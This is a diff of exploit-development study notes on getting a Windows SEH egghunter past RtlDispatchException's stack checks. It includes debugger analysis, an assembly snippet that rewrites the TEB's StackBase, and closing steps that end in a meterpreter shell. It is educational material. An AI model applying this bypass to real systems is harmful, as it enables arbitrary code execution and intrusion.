@@ -175,35 +175,50 @@ Because syscall numbers change, we want to find an egghunter workaround that is 
 	- But this never happens, every time we continue execution we get an access violation on the same `repe scasd` instruction...
 
 ### Identifying the issue in SEH
-Using static-dynamic analysis (IDA + Windbg)
-- Copy over ntdll.dll from the target box to the dev environment with something like : `[convert]::ToBase64String((Get-Content -path "C:\Windows\system32" -Encoding byte))`
-- Walk through some assembly 
-- bp ntdll!RtlDispatchException, after our access violation
-- ...RtlDispatchException -> RtlpGetStackLimits (which checks stackBase and stackLimit) -> RtlIsValidHandle (runs checks like SafeSEH if enabled)
-	- There is only one call to RtlIsValidHandle in the entire code chain, so this call must be made in order for the handler to get run
-- Dig into the comparisons / branching statements, which are the checks that must be passed to reach the RtlisvalidHandle call. Use breakpoints in Windbg to ensure our code is actually reaching those checks
-	- `cmp ecx,edi` - address of ERR (`_EXCEPTION_REGISTRATION_RECORD`) must be higher than StackLimit (must be on the stack)
-	- `cmp eax,ebx` - address of ERR must be lower than StackBase (must be on the stack)
+Using static-dynamic analysis (IDA/Ghidra + Windbg)
+- Copy over ntdll.dll from the target box to the dev environment with something like : `[convert]::ToBase64String((Get-Content -path "C:\Windows\system32" -Encoding byte))`, then reference [[notepad.exe transfer]]
+- `bp ntdll!RtlDispatchException`, after our access violation
+1. Stepping through the RtlDispatchException code flow in the disassembler, we notice a call to RtlpGetStackLimits which tips us off that there might be a check on where the exception handler resides in memory
+2. Before the call are two `lea` instructions that store addresses in edx and ecx, which will be the addresses that store the return values of StackBase and StackLimit from the function.
+	1. Jump into the function to confirm that is whats happening
+3. We search the RtlDispatchException code and find these addresses are used again later, and moved into edi (as StackLimit) and ebx (as StackBase). Following this are checks and a unique call to RtlIsValidHandler (only one in RtlDispatchException), meaning that these checks must pass in order for the exception handler to be used. 
+4. Set a breakpoint at this first check, `cmp ecx, edi`, to jump ahead and check these. This also confirms that there are no errors preceding this code block.
+5. Analyzing these checks:
+	- `cmp ecx,edi` - start address of ERR (`_EXCEPTION_REGISTRATION_RECORD`) must be higher than StackLimit 
+	- `cmp eax,ebx` - (preceded by `lea eax, [ecx+8]`), end address of ERR must be lower than StackBase
 	- `test cl,3` - address of ERR must be aligned to the four byte memory boundary 
-	- `cmp ecx,ebx` - address of the exception hander functions must be higher than StackBase or lower than StackLimit (off the stack). 
-	 > **This is the check we are failing**
+	- `cmp ecx,ebx` - (preceded by `ecx, dword ptr [ecx+4]`) address of the exception hander functions must be higher than StackBase or lower than StackLimit (off the stack). 
+	> **Our code fails the last check**
+
+![[SEH Stack Drawing.jpg]]
 
 Since there is no other compile time protections, once we pass these checks, the exploit should be good to go.
 
 ### Overcoming the SEH issue
-We can overwrite the StackBase as part of our egghunter so that our exception_handler appears to be after it (being "off" the stack) and keep the ERR on the stack. This is done by overwriting the StackBase value with an address arbitrarily (?) less than the exception_handler pointer, but still greater than the ERR which was just pushed onto the stack.
+We can overwrite the StackBase as part of our egghunter so that our exception_handler appears to be after it (seeming as if its off the stack) and keep the ERR on the stack. This is done by overwriting the StackBase value with an address arbitrarily (?) less than the exception_handler pointer, but still greater than the ERR that we pushed onto the stack.
+
+The code below is a modification to [[Egghunter SEH Example]]
 ```
 build_exception_record:
 	...
 	# where ecx is the address of the exception_handler function
 	# zero out ebx
 	xor ebx, ebx
-	# move the current stack pointer addr (the ERR) to the TEB's ExceptionList
-	move dword ptr fs:[ebx], esp
-	# set a value 4 below the except_handler function to be used as the new StackBase
+	# move the top stack addr (currently the ERR) into the TEB's ExceptionList
+	mov dword ptr fs:[ebx], esp
+	# set a value 4 below the except_handler addr to be used as the new StackBase
 	sub ecx, 0x04
-	# set the proper offset to the TEB's StackBase
+	# prepare the proper offset to the TEB's StackBase (+4)
 	add ebx, 0x04
 	# move the new addr (4 before except_handler) into the TEB's StackBase
 	mov dword ptr fs:[ebx], ecx
 ```
+
+- Generate the shellcode and input it into the exploit
+- breakpoint at EIP control point, run the exploit, and step through until the end of build_exception_record
+- With `!teb` and `dt _EXCEPTION_REGISTRATION_RECORD XXXXXXXX` to verify values like ExceptionList, StackBase, and Handler are all the expected values
+- Run the program to trigger the access violation, `!exchain`, and breakpoint at the exception_handler address
+- Step through and use `dt _CONTEXT @eax` to check eip in the ContextRecord, and `u EIP_ADDR` to verify this points to the `scas` instruction initiating the error. Repeat this on the next step (the `add... 0x06`) to ensure the eip now points to the code in loop_inc_page
+- `bc *` to clear breakpoints, `sxd av` to skip first chance exceptions, and `sxd gp` to disable guard pages
+- Set up the meterpreter listener and let the exploit run
+- Shell
